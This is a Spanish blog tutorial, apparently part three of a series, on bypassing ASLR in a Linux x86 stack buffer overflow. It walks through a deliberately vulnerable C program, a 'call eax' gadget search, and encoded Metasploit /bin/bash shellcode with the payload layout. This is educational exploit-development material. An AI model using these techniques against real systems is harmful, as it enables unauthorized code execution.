@@ -1,0 +1,356 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Desbordando el buffer en linux x86 (III) [ASLR bypass] - Security</title>
+  <meta name="author" content="q3rv0">
+
+  
+  <meta name="description" content="Esta es la tercera parte de una serie de tutoriales para aprender a explotar el buffer en sistemas Linux x86. En el anterior apartado se logro &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://q3rv0.github.io/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-iii-aslr-bypass/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="/javascripts/ender.js"></script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <link href="/atom.xml" rel="alternate" title="Security" type="application/atom+xml">
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=Arvo:400,400italic,700,700italic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="http://fonts.googleapis.com/css?family=Playball" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body>
+  <header role="banner"><hgroup>
+  <h1><a href="/">Security</a></h1>
+  
+    <h2>Follow the white rabbit&#8230;.</h2>
+  
+</hgroup>
+
+</header>
+  <div id="navigation">
+    <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:q3rv0.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  </div>
+  <div id="body"  >
+    <div id="main">
+      <div id="content">
+        <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Desbordando El Buffer en Linux X86 (III) [ASLR Bypass]</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-11-24T21:47:55+06:30" pubdate data-updated="true"></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>Esta es la tercera  parte de una serie de tutoriales para aprender a explotar el buffer en sistemas Linux x86. En el anterior apartado se logro encastrar codigo ejecutable y obtener una shell, pero para lograrlo debimos desactivar previamente ASLR.  Como explique anteriormente este sistema de seguridad nos dificulta un<!--more--> poco las cosas randomizando la memoria.</p>
+
+<p>Compilaremos el siguiente codigo que sera usado durante la realizacion de este tutorial.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;string.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">void</span> <span class="nf">funcion_vulnerable</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">input</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">1000</span><span class="p">];</span>
+</span><span class='line'>    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">input</span><span class="p">);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>    <span class="n">funcion_vulnerable</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Verificamos que ASLR se encuentra activo.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>cat /proc/sys/kernel/randomize_va_space
+</span><span class='line'>2
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>De otra manera lo activaremos.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nb">echo </span><span class="m">2</span> &gt; /proc/sys/kernel/randomize_va_space
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Ahora simplemente realizaremos los pasos descriptos en los anteriores capitulos.</p>
+
+<p>Compilamos el code.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>gcc -o vuln -fno-stack-protector -mpreferred-stack-boundary<span class="o">=</span><span class="m">2</span> -ggdb -z execstack vuln.c
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Presten atencion al flag -z execstack, esto simplemente vuelve ejecutable el stack ya que NX (Non-Exec) es otra proteccion que al igual que ASLR nos va a romper bastante las pelotas denegandonos la ejecucion de un shellcode en la memoria.</p>
+
+<p>Pero de todas maneras se puede evadir, tema que se tocara en el proximo tuto.</p>
+
+<p>Buscamos la sobrescritura del EIP.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>r $(python -c 'print "\x41"*1004+"\x42"*4')</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/VsmMcJN.png"></p>
+
+<p>Hasta aca todo muy lindo, pero todavia tenemos que saltarnos ASLR.</p>
+
+<p>Una manera de hacer esto es buscando dentro del binario alguna instruccion de  llamada o salto (CALL/JMP) a algun registro. Por que si nos basamos en seguir el anterior tutorial donde sobrescribiamos el EIP con una direccion dentro de ESP que aputaba a un NOP Sled+Shellcode, simplemente no va a funcar, por el echo de que la memoria va a cambiar en cada ejecucion.</p>
+
+<p>Esto podemos hacerlo con objdump.</p>
+
+<p>Buscaremos la existencia de alguna instruccion CALL</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>objdump -d vuln<span class="p">|</span>grep call
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/WcOw5wZ.png"></p>
+
+<p><img src="http://i.imgur.com/2cbfPTg.png"></p>
+
+<p>Perfecto, objdump nos arroja dos direcciones que llaman al registro EAX.</p>
+
+<p>8048387</p>
+
+<p>804840f</p>
+
+<p>Entonces se nos ocurre que si podemos escribir en EAX nuestro shellcode y pintar el EIP con la direccion CALL lograriamos realmente “pintarle la cara a ASLR”.</p>
+
+<p>Bien, hay una parte del buffer en EAX?</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>x/100x $eax</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/8MiR1WD.png"></p>
+
+<p>Como se aprecia, logramos tocar el comienzo del registro, ahora solamente nos falta generar el payload.</p>
+
+<p>Ahora si nos apoyaremos en  MSF para moldear un Shellcode.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf &gt; msfpayload linux/x86/exec <span class="nv">CMD</span><span class="o">=</span>/bin/bash C
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/b5EaI5R.png"></p>
+
+<p>El unico problema que surge, es que si miramos el shellcode, este contiene “badchars”, como por ejemplo la presencia de nullbytes \x00 que nos van a cortar la cadena.</p>
+
+<p>Asi que le pasamos la salida a msfencode para ofuscar un poco el code.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'>msf &gt; msfpayload linux/x86/exec <span class="nv">CMD</span><span class="o">=</span>/bin/bash R<span class="p">|</span>msfencode -a x86 -e x86/alpha_mixed -b <span class="s1">&#39;x\00\x0d\x0a&#39;</span> -t c
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://i.imgur.com/Z4R607W.png"></p>
+
+<p>Fijense en el flag -b de msfencode y entre comillas la lista de badchars a evadir.</p>
+
+<p>Ahora tenemos el codigo limpio y listo para agregarlo al payload que quedara de la siguiente manera.</p>
+
+<p>Le restamos la longitud del Shellcode al buffer.</p>
+
+<p>1004-152=852</p>
+
+<p>Menos 400 NOPS que iran antes del EIP, quedando el vector de la siguiente manera</p>
+
+<p>NOPS<em>452+Shellcode(152)+NOPS</em>400+EIP (call eax \x87\x83\x04\x08)</p>
+
+<p>Lanzamos el exploit</p>
+
+<p><img src="http://i.imgur.com/g1TDSom.png"></p>
+
+<p>Logrando esquivar satisfactoriamente ASLR.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">q3rv0</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2014-11-24T21:47:55+06:30" pubdate data-updated="true"></time>
+      
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://q3rv0.github.io/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-iii-aslr-bypass/" data-via="q3rv0" data-counturl="http://q3rv0.github.io/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-iii-aslr-bypass/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-ii-nop-sled/" title="Previous Post: Desbordando el buffer en linux x86 (II) [NOP Sled]">&laquo; Desbordando el buffer en linux x86 (II) [NOP Sled]</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-iii-aslr-bypass/">Desbordando el buffer en linux x86 (III) [ASLR bypass]</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/24/desbordando-el-buffer-en-linux-x86-ii-nop-sled/">Desbordando el buffer en linux x86 (II) [NOP Sled]</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/desbordando-el-buffer-en-linux-x86-i/">Desbordando el buffer en linux x86 (I)</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/tomando-el-control-de-una-camara-axis-parte-i/">Tomando el control de una camara AXIS – Parte I</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/escribiendo-un-auxiliar-para-msf/">Escribiendo un auxiliar para MSF</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+      </div>
+    </div>
+    <footer role="contentinfo"><p>
+  Copyright &copy; 2014 - q3rv0 -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a>. Design by <a href="http://octopressthemes.com">Octopress Themes</a></span>
+</p>
+
+</footer>
+    
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+  </div>
+</body>
+</html>
